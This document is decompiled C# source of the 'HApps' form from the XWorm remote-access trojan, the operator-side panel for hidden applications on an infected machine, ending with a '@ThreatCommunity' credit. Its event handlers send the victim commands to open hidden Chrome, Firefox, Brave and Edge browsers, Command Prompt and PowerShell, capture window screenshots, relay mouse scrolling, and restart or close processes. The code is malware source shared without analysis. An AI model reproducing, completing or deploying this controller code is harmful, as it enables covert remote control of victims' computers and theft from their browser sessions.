...
[DesignerGenerated]
public class HApps : Form
{
	[CompilerGenerated]
	internal sealed class _Closure_0024__R165_002D24
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R165_002D24(_Closure_0024__R165_002D24 arg0)
		{
			if (arg0 != null)
			{
	...
	[CompilerGenerated]
	internal sealed class _Closure_0024__R166_002D26
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R166_002D26(_Closure_0024__R166_002D26 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
	...
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CommandPromptToolStripMenuItem")]
	private ToolStripMenuItem _CommandPromptToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PowerShellToolStripMenuItem")]
	private ToolStripMenuItem _PowerShellToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CustomOpenToolStripMenuItem")]
	private ToolStripMenuItem _CustomOpenToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RestoreToolStripMenuItem")]
	private ToolStripMenuItem _RestoreToolStripMenuItem;
...
;
    ...
    [field: AccessedThroughProperty("ApplactionsToolStripMenuItem")]
    public ToolStripMenuItem ApplactionsToolStripMenuItem
    ;

    public ToolStripMenuItem CommandPromptToolStripMenuItem
    ;

    public ToolStripMenuItem PowerShellToolStripMenuItem
    ;

    public ToolStripMenuItem CustomOpenToolStripMenuItem

        ;

    [field: AccessedThroughProperty("WindowToolStripMenuItem")]
    public ToolStripMenuItem WindowToolStripMenuItem
    ;

    public ToolStripMenuItem RestoreToolStripMenuItem
    ;
...
;
    ...
    public HApps()
	{
		base.Load += HApps_Load;
		base.FormClosing += HApps_FormClosing;
		base.ResizeEnd += HApps_ResizeEnd;
		int_0 = 0;
	...
	private void InitializeComponent()
	{
		...
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(XWorm.HApps));
		...
		this.CustomOpenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        ...
        this.CommandPromptToolStripMenuItem.Click += new System.EventHandler(CommandPromptToolStripMenuItem_Click);
        this.PowerShellToolStripMenuItem.Click += new System.EventHandler(PowerShellToolStripMenuItem_Click);
        this.CustomOpenToolStripMenuItem.Click += new System.EventHandler(CustomOpenToolStripMenuItem_Click);
		...
		this.ColumnHeader3.Text = "[ App ]";
		this.ColumnHeader3.Width = 85;
		this.ColumnHeader4.Text = "[ PID ]";
		this.Guna2ContextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.GetScreenToolStripMenuItem, this.RefreshToolStripMenuItem, this.BrowserToolStripMenuItem, this.ApplactionsToolStripMenuItem, this.WindowToolStripMenuItem });
		...
		this.Guna2ContextMenuStrip2.Size = new System.Drawing.Size(152, 114);
		...
		this.GetScreenToolStripMenuItem.Size = new System.Drawing.Size(151, 22);
		...
		this.ApplactionsToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.ApplactionsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.CommandPromptToolStripMenuItem, this.PowerShellToolStripMenuItem, this.CustomOpenToolStripMenuItem });
		this.ApplactionsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("ApplactionsToolStripMenuItem.Image");
		this.ApplactionsToolStripMenuItem.Name = "ApplactionsToolStripMenuItem";
		this.ApplactionsToolStripMenuItem.Size = new System.Drawing.Size(151, 22);
		this.ApplactionsToolStripMenuItem.Text = "[ Applactions ]";
		this.CommandPromptToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.CommandPromptToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("CommandPromptToolStripMenuItem.Image");
		this.CommandPromptToolStripMenuItem.Name = "CommandPromptToolStripMenuItem";
		this.CommandPromptToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
		this.CommandPromptToolStripMenuItem.Text = "[ Command Prompt ]";
		this.PowerShellToolStripMenuItem.BackColor = System.Drawing.Color.White;
		...
		this.PowerShellToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
		this.PowerShellToolStripMenuItem.Text = "[ PowerShell ]";
		this.CustomOpenToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.CustomOpenToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("CustomOpenToolStripMenuItem.Image");
		this.CustomOpenToolStripMenuItem.Name = "CustomOpenToolStripMenuItem";
		this.CustomOpenToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
		this.CustomOpenToolStripMenuItem.Text = "[ Custom Open ]";
		this.WindowToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.WindowToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.RestoreToolStripMenuItem, this.RestartToolStripMenuItem, this.CloseToolStripMenuItem });
		this.WindowToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("WindowToolStripMenuItem.Image");
		this.WindowToolStripMenuItem.Name = "WindowToolStripMenuItem";
		this.WindowToolStripMenuItem.Size = new System.Drawing.Size(151, 22);
		...
		this.ToolStripStatusLabel1.Text = "Apps [0]";
	...
	{
		byte[] array = Module0.smethod_6("OpenEdgeBrowser");
	...
	private void HApps_Load(object sender, EventArgs e)
	{
		base.MouseWheel += HApps_MouseWheel;
		Guna2ComboBox1.SelectedIndex = 3;
		Guna2GradientButton1.PerformClick();
	}

	private void HApps_MouseWheel(object sender, MouseEventArgs e)
	{
		...
		if (e.Delta < 0)
		{
			byte[] array = Module0.smethod_6("ScrollDown" + GClass19.string_0 + point.X + GClass19.string_0 + point.Y);
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
		...
		{
			byte[] array2 = Module0.smethod_6("ScrollUp" + GClass19.string_0 + point.X + GClass19.string_0 + point.Y);
	...
	private void Guna2GradientButton1_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(Guna2GradientButton1.Text, "OFF", TextCompare: false) == 0)
		{
			...
			byte[] array = Module0.smethod_6("HApps+" + GClass19.string_0 + Guna2ComboBox1.Text.Replace("%", "").ToString());
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
	...
	private void GetScreenToolStripMenuItem_Click(object sender, EventArgs e)
	{
		...
		{
			byte[] array = Module0.smethod_6("GetHWND" + GClass19.string_0 + ListView1.SelectedItems[0].SubItems[0].Text + GClass19.string_0 + ListView1.SelectedItems[0].ImageKey.ToString() + GClass19.string_0 + PictureBox1.Width + GClass19.string_0 + PictureBox1.Height);
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
	...
	{
		byte[] array = Module0.smethod_6("Refresh");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
	...
	{
		byte[] array = Module0.smethod_6("OpenChromeBrowser");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
	...
	{
		byte[] array = Module0.smethod_6("OpenFireFoxBrowser");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
	...
	{
		byte[] array = Module0.smethod_6("OpenBraveBrowser");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
	...
	{
		byte[] array = Module0.smethod_6("OpenCommandPrompt");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
	...
	{
		byte[] array = Module0.smethod_6("OpenPowerShell");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
	...
	private void RestoreToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ListView1.SelectedItems.Count > 0)
		{
			byte[] array = Module0.smethod_6("Restore");
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
	...
	private void RestartToolStripMenuItem_Click(object sender, EventArgs e)
	{
		...
		_Closure_0024__R165_002D24 closure_0024__R165_002D = default(_Closure_0024__R165_002D24);
		foreach (ListViewItem selectedItem in ListView1.SelectedItems)
		{
			byte[] array = Module0.smethod_6("Restart" + GClass19.string_0 + selectedItem.ToolTipText + GClass19.string_0 + selectedItem.SubItems[1].Text);
			closure_0024__R165_002D = new _Closure_0024__R165_002D24(closure_0024__R165_002D);
			closure_0024__R165_002D._0024VB_0024NonLocal_2 = gclass5_0;
			ThreadPool.QueueUserWorkItem(closure_0024__R165_002D._Lambda_0024__R26, array);
		}
	}
	...
	private void CloseToolStripMenuItem_Click(object sender, EventArgs e)
	{
		...
		_Closure_0024__R166_002D26 closure_0024__R166_002D = default(_Closure_0024__R166_002D26);
		foreach (ListViewItem selectedItem in ListView1.SelectedItems)
		{
			byte[] array = Module0.smethod_6("Close" + GClass19.string_0 + selectedItem.SubItems[1].Text);
			closure_0024__R166_002D = new _Closure_0024__R166_002D26(closure_0024__R166_002D);
			closure_0024__R166_002D._0024VB_0024NonLocal_2 = gclass5_0;
			ThreadPool.QueueUserWorkItem(closure_0024__R166_002D._Lambda_0024__R28, array);
		}
	}
	...
	private void HApps_FormClosing(object sender, FormClosingEventArgs e)
	{
		byte[] array = Module0.smethod_6("CloseHApps");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
	...
	private void HApps_ResizeEnd(object sender, EventArgs e)
	{
	...
	private void CustomOpenToolStripMenuItem_Click(object sender, EventArgs e)
	{
...
//By @ThreatCommunity - @ThreatCommunity 
